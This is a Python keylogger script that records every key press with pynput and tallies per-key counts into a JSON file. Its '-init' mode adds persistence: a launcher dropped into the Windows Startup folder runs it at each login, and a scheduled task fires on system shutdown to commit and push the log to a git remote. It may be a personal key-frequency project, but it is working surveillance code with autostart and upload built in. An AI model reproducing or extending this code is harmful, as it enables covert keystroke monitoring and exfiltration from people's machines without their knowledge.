import json
import os
import subprocess
import sys
from pynput.keyboard import Key, Listener
from pynput import keyboard, mouse

log_file = 'keystrokes.json'
max_buffer_size = 10


class Autostart:
    def __init__(self, repo_path):
        self.repo_path = repo_path

    def push_git(self):
        os.system(f'git -C {self.repo_path} add {log_file}')
        os.system(f'git -C {self.repo_path} commit -m "Update {log_file}"')
        os.system(f'git -C {self.repo_path} push')

    def create_shutdown_task(self, repo_path):
        task_name = "GitPushOnShutdown"
        task_description = "Push changes to Git repository on system shutdown"
        trigger_event = "On an event"
        log = "System"
        source = "USER32"
        event_id = "1074"


        print('step 1', repo_path)
        # Git commands to be executed
        git_commands = f'git -C {repo_path} add . && git -C {repo_path} commit -m "Update" && git -C {repo_path} push' # Add, commit, and push changes and close the terminal window

        # Create the task using schtasks
        command = [
            "schtasks", "/Create", "/TN", task_name, "/TR", f'cmd /c "{git_commands}"',
            "/SC", "ONEVENT", "/EC", log, "/MO", f'*[System/EventID={event_id}]',
            "/F"
        ]

        try:
            subprocess.run(command, check=True)
            print(f"Task '{task_name}' created successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to create task: {e}")

    def create_autostart_script(self, repo_path, script_name='autostart_keylogger_script.py'):
        # Determine the path to the autostart folder
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Path to the autostart script
        autostart_script_path = os.path.join(startup_folder, script_name)


        # Check if a file with the same name already exists and create a new name if necessary
        base_name, extension = os.path.splitext(script_name)
        counter = 1
        while os.path.exists(autostart_script_path):
            autostart_script_path = os.path.join(startup_folder, f"{base_name}_{counter}{extension}")
            counter += 1



        # Content of the autostart script
        autostart_script_content = f"""import os
import sys
try:
    # Path to the repository
    repo_path = r"{repo_path}"
    # Change the current working directory to the repository path
    os.chdir(repo_path)
    # Run the main script
    main_script = os.path.join(repo_path, 'keylogger.py')
    os.system(f'python "{{main_script}}"')
except Exception as e:
    print(e)
    sys.exit(1)
        """

        # Write the autostart script to the autostart folder
        with open(autostart_script_path, 'w') as f:
            f.write(autostart_script_content)


         
        if os.path.exists(autostart_script_path):   ##run the script
            os.system(f'python "{autostart_script_path}"')


        print(f"Autostart script created at: {autostart_script_path}")


class Buffer:
    def __init__(self, max_size, file_path):
        self.max_size = max_size
        self.file_path = file_path
        self.buffer = {}

    def add(self, key):
        key = str(key)
        if key in self.buffer:
            self.buffer[key] += 1
        else:
            self.buffer[key] = 1

        print("Buffer: ", self.buffer)

        if len(self.buffer) >= self.max_size:
            self.flush()


    def flush(self):
        if not self.buffer:
            return
    
        # Check if the file exists
        if os.path.exists(self.file_path):
            with open(self.file_path, 'r') as f:
                try:
                    existing_data = json.load(f)  # Load existing data from the file
                except json.JSONDecodeError:
                    existing_data = {}  # If the file is empty or invalid, start with an empty dictionary
        else:
            existing_data = {}  # If the file does not exist, start with an empty dictionary

        # Update the existing data with the buffer's contents
        for key, value in self.buffer.items():
            if key in existing_data:
                existing_data[key] += value  # Add new keystrokes to the existing value
            else:
                existing_data[key] = value  # Add new key-value pair

        # Write the updated data back to the file
        with open(self.file_path, 'w') as f:
            json.dump(existing_data, f, indent=4)

        # Clear the buffer after flushing
        self.buffer.clear()



if __name__ == '__main__':


    ##get arugments from command line
    print('Number of arguments:', len(sys.argv), 'arguments.')
    print('Argument List:', str(sys.argv))

    if len(sys.argv) > 1 and sys.argv.index('-init') == 1:

        print('Initializing keylogger')
        # Path to your repository
        repo_path = os.path.abspath(os.path.dirname(__file__))
        # Create the autostart script
        autostart = Autostart(repo_path)

        # Create the shutdown task
        autostart.create_shutdown_task(repo_path)

        autostart.create_autostart_script(repo_path)

    
    else:
        print('Starting keylogger')

        buffer = Buffer(max_size=max_buffer_size, file_path=log_file)


        def on_release(key):
            try:
                pass
            except KeyError:
                pass

        def on_key_press(key):
            print("Key pressed: ", key)
            buffer.add(key)

        with Listener(on_press=on_key_press, on_release=on_release) as listener:
            listener.join()
